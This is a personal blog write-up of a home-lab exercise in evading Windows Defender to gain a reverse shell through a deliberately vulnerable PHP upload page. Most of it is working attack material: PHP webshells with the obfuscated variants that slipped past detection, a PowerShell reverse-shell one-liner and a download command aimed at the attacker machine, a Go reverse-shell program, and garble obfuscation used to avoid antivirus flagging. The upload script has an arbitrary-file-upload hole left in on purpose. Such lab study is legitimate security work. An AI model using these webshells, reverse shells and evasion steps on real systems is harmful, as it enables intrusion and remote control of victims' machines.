
<h1 id="goal">Goal</h1>
<p>Bypass Windows Defender protections and get reverse shell.</p>

<h1 id="preable">Preable</h1>
<p>I know zero about AV evasion. Everything that itâ€™s written in this article is based on my experience, donâ€™t take my words for guaranted. I started the tests around the following date: <code class="highlighter-rouge">15/12/2021</code></p>

<h1 id="setup">Setup</h1>

<table>
  <thead>
    <tr>
      <th style="text-align: center">Role</th>
      <th style="text-align: center">Machine</th>
      <th style="text-align: center">IP</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">Target</td>
      <td style="text-align: center">Windows 10</td>
      <td style="text-align: center">192.168.80.142</td>
    </tr>
    <tr>
      <td style="text-align: center">Attacker</td>
      <td style="text-align: center">Kali Linux</td>
      <td style="text-align: center">192.168.80.131</td>
    </tr>
  </tbody>
</table>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Windows Software</th>
      <th style="text-align: left">Version</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">XAMPP</td>
      <td style="text-align: left">3.3.0</td>
    </tr>
    <tr>
      <td style="text-align: left">PHP</td>
      <td style="text-align: left">8.0.13</td>
    </tr>
    <tr>
      <td style="text-align: left">Apache</td>
      <td style="text-align: left">2.4.51</td>
    </tr>
  </tbody>
</table>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Linux Software</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">curl</td>
    </tr>
    <tr>
      <td style="text-align: left">go</td>
    </tr>
  </tbody>
</table>

<h2 id="directory-tree">Directory tree</h2>

<p>ðŸ“¦phpuploads
 â”£ ðŸ“‚uploads
 â”£ ðŸ“œindex.php</p>

<p>## Source</p>

<pre><code class="language-phtml">//index.php

&lt;?php
  ini_set('display_errors', 1);
  ini_set('display_startup_errors', 1);
  error_reporting(E_ALL);
  if (isset($_FILES['userfile'])){
	  $uploadfile = "./uploads/" . basename($_FILES['userfile']['name']);
	  if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)){
		  echo "File uploaded correctly";
		}else{
		  echo "couldn't upload file.";
		}
	}
?&gt;

&lt;!DOCTYPE html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;title&gt;PHP Tests&lt;/title&gt;
	&lt;/head&gt;

 	&lt;body&gt;
		&lt;form enctype="multipart/form-data" method="POST"&gt;
			&lt;input type="file" name="userfile" /&gt;
			&lt;input type="submit" /&gt;
		&lt;/form&gt;
 	&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<hr />

<p>The webserver hosted on the Windows machine will simply serve a php script that allows clients to upload files to later retreive them.</p>

<p>The webserver is vulnerable to arbitrary file upload, so the goal is to obtain a reverse shell or at least a webshell that can run command on the infected machine.</p>

<p>The Kali Linux machine is just my working machine.</p>

<h1 id="functionality-check">Functionality Check</h1>
<p>Checks firsts, we have to send a file sample and trying to retreive it later.</p>

<p><img src="/assets/23bc99a820187c8cbd51c988d9383ada.png" alt="23bc99a820187c8cbd51c988d9383ada.png" />
This is how the webpage looks like. We could upload them from the browser but Iâ€™d prefer uploading them via  <code class="highlighter-rouge">curl</code>.
Assuming that we have a file called <code class="highlighter-rouge">test.txt</code>  in our current directory, we could upload it using the following command:</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>curl -s -F <span class="s1">'userfile=@test.txt'</span> http://192.168.80.142/phpuploads/index.php
</code></pre></div>

<p><img src="/assets/6627ad47f1097a70807209dce05ecdbd.png" alt="6627ad47f1097a70807209dce05ecdbd.png" /></p>

<p>To check if we can retreive the file, we can just check it in the folder <code class="highlighter-rouge">uploads</code>.</p>

<div class="language-bash highlighter-rouge"><pre class="codehilite"><code>curl -s http://192.168.80.142/phpuploads/uploads/test.txt
</code></pre></div>

<p><img src="/assets/7bf79e6b155f1f368a1cb1b1249af9a2.png" alt="7bf79e6b155f1f368a1cb1b1249af9a2.png" /></p>

<p>If every check that we made is positive, then we can start with the exercise.</p>

<p>To easy upload and check, I used the following bash command:</p>
<div class="language-bash highlighter-rouge"><pre class="codehilite"><code><span class="nv">MYFILE</span><span class="o">=</span><span class="s2">"file/to/upload.ext"</span>;
curl -s -F <span class="s2">"userfile=@</span><span class="nv">$MYFILE</span><span class="s2">"</span> <span class="s2">"http://192.168.80.142/phpuploads/index.php"</span> <span class="o">&amp;&amp;</span>
<span class="o">(</span><span class="nb">echo</span> -e -n <span class="s2">"</span><span class="se">\n</span><span class="s2">Result: "</span>;
curl -s <span class="s2">"http://192.168.80.142/phpuploads/uploads/</span><span class="k">$(</span>basename <span class="nv">$MYFILE</span><span class="k">)</span><span class="s2">"</span><span class="o">)</span>;
</code></pre></div>

<p>So in this way, I just have to change the content of the variable <code class="highlighter-rouge">MYFILE</code>.</p>

<p><img src="/assets/48f3a93de1a4f1ac1129c8aab591052b.png" alt="48f3a93de1a4f1ac1129c8aab591052b.png" /></p>

<h1 id="narrative">Narrative</h1>

<h2 id="filename-alerts">Filename alerts</h2>
<p>I wanted to test out if some filenames will alert Windows Defender. So what I did was stesting a bunch of filename that could be suspicious but every single of them contains the following code:</p>

<div class="language-php highlighter-rouge"><pre class="codehilite"><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="s2">"hello world"</span><span class="p">;</span> <span class="cp">?&gt;</span>
</code></pre></div>

<p>These are the filename that I used:
| Filenames | 
| :â€”â€”â€“ |
| webshell.php |
| reversesell.php |
| meterpreter.php |
| c99shell.php |
| cmd.php |
| payload.php |</p>

<p>For every request made, I was able to even execute those files.
<img src="/assets/b26fde4ca56638851863f370b3d19319.png" alt="b26fde4ca56638851863f370b3d19319.png" /></p>

<p><img src="/assets/80af86754a48132c17809ca0b8ba48de.png" alt="80af86754a48132c17809ca0b8ba48de.png" /></p>

<p>None of them resulted into being flagged by the AV. 
To make sure, I ran Windows Defender on the upload folder.</p>

<p><img src="/assets/6fbe93a30f04f2d7a63522c6ff4b7403.png" alt="6fbe93a30f04f2d7a63522c6ff4b7403.png" /></p>

<p><img src="/assets/3af9da6979a07b05da958af9748ed688.png" alt="3af9da6979a07b05da958af9748ed688.png" /></p>

<p>So no current threats.</p>

<p>I wil <strong>assume</strong> that Windows Defender doesnâ€™t actually care about the filename, rather the content of it.</p>

<h2 id="content-alert">Content alert</h2>
<p>For this exercise, I will go from easy techniques to medium/complex one (as far as complex I can go of course).</p>

<p>Rules that I put myself for this exercise are:</p>
<ul>
  <li>WebShell needs to execute system commands.</li>
  <li>WebShell should not hardcode the command to run (e.g.: <code class="highlighter-rouge">system('malicious command')</code>)</li>
  <li>The command should be sent from Client to Server. The WebShell should not fetch the command on other service (like performing an HTTP request to a server that we own).</li>
</ul>

<p>For the first part of this exercise, Iâ€™m gonna use the <code class="highlighter-rouge">system</code> function to execute the command.</p>

<p>I wanted to try with the simple ones, but first Iâ€™ll show an example on how to understand that our WebShell got caught by Windows Defender:</p>

<p>I uploaded the following PHP script.</p>
<div class="language-php highlighter-rouge"><pre class="codehilite"><code><span class="cp">&lt;?php</span>
	<span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]);</span>
<span class="cp">?&gt;</span>
</code></pre></div>
<p>And as soon as I tried to reach that file via curl, Windows Defender caught it.</p>

<p><img src="/assets/cf0d9c4fc113ad183bb36fd193999c89.png" alt="cf0d9c4fc113ad183bb36fd193999c89.png" /></p>

<p>And this is the output from my terminal:</p>

<p><img src="/assets/e53856ba93313bee1fa485756cf22114.png" alt="e53856ba93313bee1fa485756cf22114.png" /></p>

<p>So upload was successful, but execution failed.</p>

<p>Listed here (with the name as comment), I performed some mutation of the previous WebShell to figure out how little I can change to bypass Windows Defender.</p>
<div class="language-php highlighter-rouge"><pre class="codehilite"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]);</span> <span class="cp">?&gt;</span> //SYS_GET_C
<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'foo'</span><span class="p">]);</span> <span class="cp">?&gt;</span> //SYS_GET_FOO
<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_COOKIES</span><span class="p">[</span><span class="s1">'foo'</span><span class="p">]);</span> <span class="cp">?&gt;</span> //SYS_COOKIE_FOO
<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"HTTP_X_DATA"</span><span class="p">]);</span> <span class="cp">?&gt;</span> //SYS_HEADER_DATA
<span class="cp">&lt;?php</span> <span class="nv">$LOL</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">;</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$LOL</span><span class="p">[</span><span class="s1">'foo'</span><span class="p">]);</span>  <span class="cp">?&gt;</span> //VAR_SYS_GET_FOO
<span class="cp">&lt;?php</span> <span class="nv">$LOL</span><span class="o">=</span><span class="s1">'system($_GET["c"]);'</span><span class="p">;</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$LOL</span><span class="p">);</span> <span class="cp">?&gt;</span> //STR_SYS_GET_C_EVAL
<span class="cp">&lt;?php</span> <span class="nv">$LOL</span><span class="o">=</span><span class="s2">"sy"</span><span class="o">.</span><span class="s2">"stem(</span><span class="se">\$</span><span class="s2">_GET['c']);"</span><span class="p">;</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$LOL</span><span class="p">);</span> <span class="cp">?&gt;</span> //BROKEN_SYS_GET_C_EVAL
</code></pre></div>

<p>Fun fact, every single WebShell got caught besides from <code class="highlighter-rouge">BROKEN_SYS_GET_C_EVAL</code> (the last one).
Apparently, breaking the string was enought to make me bypass Windows Defender.</p>

<p><img src="/assets/10e4b64505e98b57b0a1875aa35b0636.png" alt="10e4b64505e98b57b0a1875aa35b0636.png" /></p>

<p>I am already happy, but I wanna try to use other functions besides from <code class="highlighter-rouge">system</code>. So I tried with <code class="highlighter-rouge">exec</code>.
Keep in mind that <code class="highlighter-rouge">exec</code> doesnâ€™t output directly the data as <code class="highlighter-rouge">system</code> does, so we have to print it out on our own.</p>

<p>To check again, I tried with a simple one:</p>
<div class="language-php highlighter-rouge"><pre class="codehilite"><code><span class="cp">&lt;?php</span>
	<span class="k">echo</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]);</span>
<span class="cp">?&gt;</span>
</code></pre></div>
<p>and to my surprise, it worked.</p>

<p><img src="/assets/163571240be1e5671df0b318e7dd9986.png" alt="163571240be1e5671df0b318e7dd9986.png" /></p>

<p><img src="/assets/11e1aac72544ecb088b86244d5d1e5b7.png" alt="11e1aac72544ecb088b86244d5d1e5b7.png" /></p>

<p>I donâ€™t know why, but it worked. Thereâ€™s literally no obfuscation.
I wanna make the output a little bit better because <code class="highlighter-rouge">exec</code> returns only the first line of the output of the command, but by specifying an array it will put all the lines of the output inside that array.</p>

<div class="language-php highlighter-rouge"><pre class="codehilite"><code><span class="cp">&lt;?php</span>
	<span class="nv">$a</span><span class="o">=</span><span class="p">[];</span>
	<span class="nb">exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"c"</span><span class="p">],</span> <span class="nv">$a</span><span class="p">);</span>
	<span class="k">echo</span> <span class="nb">implode</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p><img src="/assets/8880595061bf8ca552731acf64cc289b.png" alt="8880595061bf8ca552731acf64cc289b.png" /></p>

<p>This tells me a lot. But I guess Windows Defender is not designed to catch this kind of attacks or Payloads, which is okay.</p>

<h2 id="command-alert">Command alert</h2>
<p>Not because our webshell sists there and gets execute means that we can perform malicious actions. It could be that if we try to perform or run suspicious commands, Windows Defender will stop us from executing them.</p>

<p>Iâ€™m gonna assume that weâ€™re using the <code class="highlighter-rouge">BROKEN_SYS_GET_C_EVAL</code> webshell.</p>

<p>To try to trigger Windows Defender, I though about spawning a reverse shell. Here there are no rules besides from the fact Windows Defender should be on.</p>

<p>I started with a classic one from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell">Payload All The Things</a>:</p>
<div class="language-terminal highlighter-rouge"><pre class="codehilite"><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command
New-Object System.Net.Sockets.TCPClient("192.168.80.131",8080);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	$sendback = (iex $data 2&gt;&amp;1 | Out-String );
	$sendback2  = $sendback + "PS " + (pwd).Path + "&gt; ";
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()
};
$client.Close()
</code></pre></div>
<blockquote>
  <p>In the terminal itâ€™s a oneliner, here I reported it with spaces and newlines to better see and understand what the payload is doing.</p>
</blockquote>

<p>But no success. This is due to the fact that it gets detected by Windows Defender and we can see it in the Apache error logs:
<img src="/assets/37a52f97baac575fc7962967d1c340a1.png" alt="37a52f97baac575fc7962967d1c340a1.png" /></p>

<p>So what I did was to just create an executable that is able to spawn the reverse shell for me.</p>

<p>I used golang for this purpose since Iâ€™m confident with it and also itâ€™s easy to perform <a href="https://en.wikipedia.org/wiki/Cross_compiler">cross compile</a>.</p>

<div class="language-go highlighter-rouge"><pre class="codehilite"><code><span class="k">package</span><span class="x"> </span><span class="n">main</span><span class="x">
</span><span class="k">import</span><span class="x"> </span><span class="p">(</span><span class="s">"os/exec"</span><span class="x">
        </span><span class="s">"os"</span><span class="x">
        </span><span class="s">"net"</span><span class="p">)</span><span class="x">

</span><span class="k">func</span><span class="x"> </span><span class="n">main</span><span class="p">(){</span><span class="x">
        </span><span class="n">beeboop</span><span class="p">,</span><span class="x"> </span><span class="n">_</span><span class="o">:=</span><span class="n">net</span><span class="o">.</span><span class="n">Dial</span><span class="p">(</span><span class="s">"tcp"</span><span class="p">,</span><span class="x"> </span><span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">1</span><span class="p">])</span><span class="x">
        </span><span class="n">lol</span><span class="o">:=</span><span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">2</span><span class="p">])</span><span class="x">
        </span><span class="n">lol</span><span class="o">.</span><span class="n">Stdin</span><span class="o">=</span><span class="n">beeboop</span><span class="x">
        </span><span class="n">lol</span><span class="o">.</span><span class="n">Stdout</span><span class="o">=</span><span class="n">beeboop</span><span class="x">
        </span><span class="n">lol</span><span class="o">.</span><span class="n">Stderr</span><span class="o">=</span><span class="n">beeboop</span><span class="x">
        </span><span class="n">lol</span><span class="o">.</span><span class="n">Run</span><span class="p">()</span><span class="x">
</span><span class="p">}</span><span class="x">
</span></code></pre></div>
<p>The program accepts two arguments:</p>
<ul>
  <li>The address and port to connect to</li>
  <li>The binary to execute</li>
</ul>

<p>Upon execution it contacts the address supplied, spawns a process and attaches the stdin, stdout, stderr of the process to the socket.
To compile on Linux for Windows:</p>
<div class="language-terminal highlighter-rouge"><pre class="codehilite"><code>env GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" reverse_shell.go
</code></pre></div>

<p>I renamed the executable in <code class="highlighter-rouge">general.exe</code> , uploaded the executable on a web server and downloaded it by using the following payload on our target:</p>
<div class="language-terminal highlighter-rouge"><pre class="codehilite"><code>powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.80.131:8000/general.exe','general.exe')
</code></pre></div>
<blockquote>
  <p>NOTE: Downloading payload by using <code class="highlighter-rouge">certutil.exe</code> caught Windows Defender attention. I didnâ€™t show the steps to just not make the article too long.</p>
</blockquote>

<p>and then executing the downloaded file by passing the address of the attacking machine and the name of the programm to execute:</p>
<div class="language-terminal highlighter-rouge"><pre class="codehilite"><code>.\general.exe 192.168.80.131:8080 powershell
</code></pre></div>

<p>And it luckly gets executed.
<img src="/assets/811d5171da65af19ddbbabca6a472a67.png" alt="811d5171da65af19ddbbabca6a472a67.png" /></p>

<h2 id="obfuscation">Obfuscation</h2>
<p>For whatever reason, after a while it got flagged again by Windows Defender.</p>

<p><img src="/assets/905c49c9afa7c794cbbcd6b0aed2d328.png" alt="905c49c9afa7c794cbbcd6b0aed2d328.png" /></p>

<p>Unfortunately, I wasnâ€™t able to find my way to obfuscate the executable so I had to use this wonderful tool called <a href="https://github.com/burrowers/garble">garble</a> to compile golang code and obfuscate it. After installing it, all I did was to just simply run the compiling command but repleacing <code class="highlighter-rouge">go</code> with <code class="highlighter-rouge">garble</code>:</p>

<div class="language-terminal highlighter-rouge"><pre class="codehilite"><code>env GOOS=windows GOARCH=amd64 garble build -ldflags "-s -w" reverse_shell.go
</code></pre></div>

<p>And this time, Windows Defender does not flag our binary as malicious.</p>

<p>Iâ€™m not gonna cover the privilege escalation part simply because I am currently not skilled enough for this and also because I didnâ€™t set-up a privilege escalation vector on the Windows machine.</p>

<h1 id="thanks">Thanks</h1>

<p>A special thanks to my partner for every time she supported me into all of this madnes.</p>

<hr />

<blockquote class="twitter-tweet" data-lang="en" data-theme="dark"><p lang="en" dir="ltr">There may be blogs out there with &quot;facts about The Thing&quot;, but your unique value-add is &quot;facts about me apprehending Facts About The Thing&quot;, which can be especially useful for people already afflicted by expert blindness</p>&mdash; KURT W.K. (@thekurtwk) <a href="https://twitter.com/thekurtwk/status/1470936302426198030?ref_src=twsrc%5Etfw">December 15, 2021</a></blockquote>
<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

<p>Many thanks to KURT W.K. for giving me a valid point of view.</p>

<hr />
<p>Thanks to Essbee, a polar bear that is living her best life through many high and lows.</p>

